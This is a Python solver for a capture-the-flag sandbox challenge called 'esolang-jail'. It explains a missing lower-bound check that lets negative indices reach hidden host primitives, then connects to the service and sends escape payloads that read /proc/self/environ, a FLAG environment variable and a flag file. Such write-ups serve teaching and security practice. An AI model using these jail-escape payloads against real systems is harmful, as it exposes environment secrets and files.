#!/usr/bin/env python3
"""Solver for esolang-jail (Marble jail escape).

The jail exposes the Marble standard library through the SYS gate and guards it
with a single upper bound:

    if index >= SAFE_COUNT (== 8):  reject

The guard forgets the LOWER bound. `SYS` pops its index off the stack, and the
standard library and the interpreter's private host primitives live in ONE
Python dispatch list:

    [ strlen, concat, substr, itoa, atoi, upper, ord, chr,   # 0..7 (exposed)
      env, read ]                                            # 8..9 (hidden)

A negative index is never rejected, and Python list indexing wraps it around:

    SYS -1  ->  DISPATCH[-1]  ->  read(path)      (host file read)
    SYS -2  ->  DISPATCH[-2]  ->  env(name)       (host env lookup)

Negative literals are not accepted by the tokenizer, but the language produces
negatives with arithmetic (`0 1 SUB` or `1 NEG`). So the escape is:

    "/proc/self/environ" 0 1 SUB SYS PRINT     # arbitrary file read -> FLAG=...

Reading /proc/self/environ needs no prior knowledge of the flag's path or env
var name; the flag is right there in the process environment. We also try the
direct env lookup and the flag file as belt-and-braces.

Usage:
    python3 solve.py <host> <port>
    python3 solve.py localhost 9301
"""
import re
import socket
import sys

FLAG_RE = re.compile(rb"NCTF\{[^}]+\}")

# Escape programs, most general first. Each is one Marble line.
PROGRAMS = [
    b'"/proc/self/environ" 0 1 SUB SYS PRINT',   # read() via SYS -1 -> environ
    b'"FLAG" 0 2 SUB SYS PRINT',                 # env("FLAG") via SYS -2
    b'"/flag/flag.txt" 1 NEG SYS PRINT',         # read() via SYS -1 -> flag file
]


def main():
    if len(sys.argv) < 3:
        print(f"usage: {sys.argv[0]} <host> <port>", file=sys.stderr)
        return 2
    host, port = sys.argv[1], int(sys.argv[2])

    with socket.create_connection((host, port), timeout=15) as s:
        s.settimeout(5)
        buf = b""

        def drain():
            nonlocal buf
            try:
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    buf += chunk
            except socket.timeout:
                pass

        drain()  # banner + first prompt

        # Sanity: confirm the naive path is blocked (fair, quick to show).
        s.sendall(b"8 SYS\n")
        drain()
        if b"out of exposed range" in buf:
            print("[*] naive `8 SYS` rejected by the jail, as expected")

        for prog in PROGRAMS:
            s.sendall(prog + b"\n")
            drain()
            m = FLAG_RE.search(buf)
            if m:
                print(f"[+] escape line: {prog.decode()}")
                print(f"[+] FLAG: {m.group(0).decode()}")
                return 0

    print("[-] no flag recovered", file=sys.stderr)
    print(buf.decode("utf-8", "replace"), file=sys.stderr)
    return 1


if __name__ == "__main__":
    sys.exit(main())
